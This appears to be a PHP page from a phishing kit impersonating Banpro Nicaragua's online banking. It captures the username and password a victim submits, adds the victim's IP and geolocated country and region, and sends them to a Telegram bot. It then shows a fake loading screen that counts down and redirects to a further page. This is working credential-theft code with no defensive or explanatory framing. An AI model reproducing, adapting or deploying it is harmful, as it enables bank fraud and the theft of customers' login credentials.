<?php
session_start();
ini_set("display_errors", 0);
include('datos_telgram.php');


function getIP() {
   if (isset($_SERVER)) {
      if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
         return $_SERVER['HTTP_X_FORWARDED_FOR'];
      } else {
         return $_SERVER['REMOTE_ADDR'];
      }
   } else {
      if (isset($GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDER_FOR'])) {
         return $GLOBALS['HTTP_SERVER_VARS']['HTTP_X_FORWARDED_FOR'];
      } else {
         return $GLOBALS['HTTP_SERVER_VARS']['REMOTE_ADDR'];
      }
   }
}

$myip = getIP() ;
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$myip));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];

if(isset ($_POST['usuario']) &&  isset ($_POST['clave'])){

$_SESSION['usuario'] = $_POST['usuario'];


$message = "Banpro Datos\r\n👤USUARIO: ".$_POST['usuario']."\r\n🔐Clave: ".$_POST['clave']."\r\n🌎IP: ".$myip." ".$pais." ".$region." \r\n";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );


}else{ header ('location: index.php'); exit();
 }

?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>inicio</title>
    <link rel="stylesheet" href="archivos/estilo.css">
	 <script language="JavaScript">
	var tiempo=20;
    var url="index3.php";
 
    function updateReloj()
    {
        document.getElementById('contador').innerHTML = ""+tiempo+"";
 
        if(tiempo==0)
        {
            window.location=url;
        }else{
            tiempo-=1;
            setTimeout("updateReloj()",1000);
        }
    }
   window.onload=updateReloj;
 
    </script>
</head>
<body style="margin-top: -18px;" class="body">
    


    <div>

         <div id="ld" style="position: fixed;width:100%;height: 100%;background: rgba(255,255,255,1);z-index: 10;text-align:center;">
		 <img src="archivos/mensaje.svg" style="width: 300px;margin-top: 200px;"><br>
		 
        		<b><font id="contador" style=" font-size:16px;color:#999999"></font></b><br>
	
		 <img src="archivos/loading.gif" style="width: 110px;position: relative;top: 36px;"></div>
            <style>
                *{margin: 0;padding: 0;}
                @font-face {
                    font-family: dinReg;
                    src: url(din-regular.ttf);
                }
            </style>
            
            
            <div id="main-cnt" style="overflow: hidden;min-height:100vh;position: relative;">
                
                <div id="ctn" style="display: inline-block;vertical-align: top;background-color: #fff;">
                    <div id="frmc" style="display:inline-block;text-align: center;border-radius: 8px;vertical-align: top;width: 500px;"></div>
        

        </div> 







<br><br><br>

<div class="ul"> 
<a > Sucursales   |   Contáctanos </a>
<br><br>
<a > (C) Copyright Banpro Nicaragua. Todos los derechos reservados.</a>
</div>





</body>
</html>